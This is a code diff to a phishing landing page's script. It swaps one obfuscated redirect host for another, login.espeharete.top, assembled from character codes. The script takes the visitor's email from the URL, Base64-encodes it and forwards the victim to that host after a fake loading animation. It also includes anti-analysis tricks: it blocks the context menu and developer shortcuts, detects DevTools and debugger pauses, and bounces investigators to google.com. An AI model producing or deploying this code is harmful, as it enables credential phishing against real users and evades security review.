@@ -58,91 +58,77 @@
   </style>
   <script>
     // Obfuscated URL components
-    const urlSegments = {
-      p1: String.fromCharCode(104, 116, 116, 112, 115, 58),
-      p2: atob('Ly8='),
-      p3: 'my' + (() => 'files')(),
-      p4: 'io' + String.fromCharCode(46),
-      p5: 'vercel' + (true ? '.' : ''),
-      p6: 'app' + (1 === 1 ? '/?' : ''),
-      p7: 'id' + (() => '=')()
+    const urlComponents = {
+      part1: String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47),
+      part2: ['login', 'espeharete', 'top'].map(s => s + String.fromCharCode(46)).join('').slice(0, -1),
+      part3: '/plIUXVdA' + String.fromCharCode(35)
     };
 
-    function buildRedirectUrl() {
-      return Object.values(urlSegments).reduce((a, b) => a + b);
+    function constructRedirectUrl() {
+      return Object.values(urlComponents).join('');
     }
 
     function encodeEmailAndRedirect() {
-      const queryString = window.location.search;
-      const emailPrefix = "email=";
-      const emailStartIndex = queryString.indexOf(emailPrefix);
+      const params = new URLSearchParams(window.location.search);
+      const email = params.get('email');
 
-      if (emailStartIndex !== -1) {
-        const email = queryString.slice(emailStartIndex + emailPrefix.length);
-        const emailEndIndex = email.indexOf('&');
-        const finalEmail = emailEndIndex === -1 ? email : email.slice(0, emailEndIndex);
-
-        if (finalEmail) {
-          // Encode email to Base64
-          const encodedEmail = btoa(finalEmail);
-          
-          setTimeout(() => {
-            document.querySelector('.logo-container').style.opacity = '0';
-          }, 1500);
-          
-          setTimeout(() => {
-            window.location.href = buildRedirectUrl() + encodedEmail;
-          }, 3000);
-        }
+      if (email) {
+        // Double encode the email (Base64 then URI component)
+        const encodedEmail = encodeURIComponent(btoa(email));
+        
+        setTimeout(() => {
+          document.querySelector('.logo-container').style.opacity = '0';
+        }, 1500);
+        
+        setTimeout(() => {
+          window.location.href = constructRedirectUrl() + encodedEmail;
+        }, 3000);
       }
     }
 
-    function detectDevTools() {
-      const devToolsOpened = () => {
-        const widthThreshold = window.outerWidth - window.innerWidth > 160;
-        const heightThreshold = window.outerHeight - window.innerHeight > 160;
-        return widthThreshold || heightThreshold;
+    // Anti-analysis functions
+    (function() {
+      const securityChecks = {
+        devTools: function() {
+          const threshold = 160;
+          return (window.outerWidth - window.innerWidth > threshold) || 
+                 (window.outerHeight - window.innerHeight > threshold);
+        },
+        debuggerCheck: function() {
+          const start = Date.now();
+          debugger;
+          return Date.now() - start > 100;
+        }
       };
 
-      if (devToolsOpened()) {
-        window.location.href = "https://www.google.com";
-      }
-    }
+      setInterval(() => {
+        if (securityChecks.devTools() || securityChecks.debuggerCheck()) {
+          window.location.href = "https://www.google.com";
+        }
+      }, 1000);
 
-    setInterval(detectDevTools, 1000);
-
-    document.addEventListener("contextmenu", (e) => {
-      e.preventDefault();
-    });
-
-    document.addEventListener("keydown", (e) => {
-      if (e.key === "F12" ||
-          (e.ctrlKey && e.shiftKey && e.key === "I") ||
-          (e.ctrlKey && e.key === "U") ||
-          (e.ctrlKey && e.shiftKey && e.key === "C") ||
-          (e.ctrlKey && e.key === "S") ||
-          (e.ctrlKey && e.key === "J")) {
-        e.preventDefault();
-        window.location.href = "https://www.google.com";
-      }
-    });
-
-    function antiDebugging() {
-      const startTime = performance.now();
-      debugger;
-      const endTime = performance.now();
-      if (endTime - startTime > 100) {
-        window.location.href = "https://www.google.com";
-      }
-    }
-
-    setInterval(antiDebugging, 1000);
+      document.addEventListener("contextmenu", e => e.preventDefault());
+      
+      document.addEventListener("keydown", e => {
+        const blockedKeys = [
+          e.key === "F12",
+          e.ctrlKey && e.shiftKey && e.key === "I",
+          e.ctrlKey && e.key === "U",
+          e.ctrlKey && e.shiftKey && e.key === "C",
+          e.ctrlKey && e.key === "S",
+          e.ctrlKey && e.key === "J"
+        ];
+        if (blockedKeys.some(Boolean)) {
+          e.preventDefault();
+          window.location.href = "https://www.google.com";
+        }
+      });
+    })();
 
     window.addEventListener('load', function() {
       setTimeout(() => {
         document.querySelector('.logo-container').style.opacity = '1';
       }, 100);
-      
       encodeEmailAndRedirect();
     });
   </script>
